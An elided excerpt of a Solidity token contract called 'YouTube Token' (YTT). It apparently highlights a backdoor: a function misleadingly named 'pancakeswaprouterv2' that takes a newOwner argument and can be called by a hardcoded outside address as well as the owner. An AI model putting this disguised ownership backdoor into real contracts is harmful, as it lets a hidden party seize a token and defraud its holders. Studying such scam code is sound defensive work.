...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xba02DBF4159227a2037E89209231E30860Cf1879));
...
contract YTToken is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "YTT";
  string private _name = "YouTube Token";
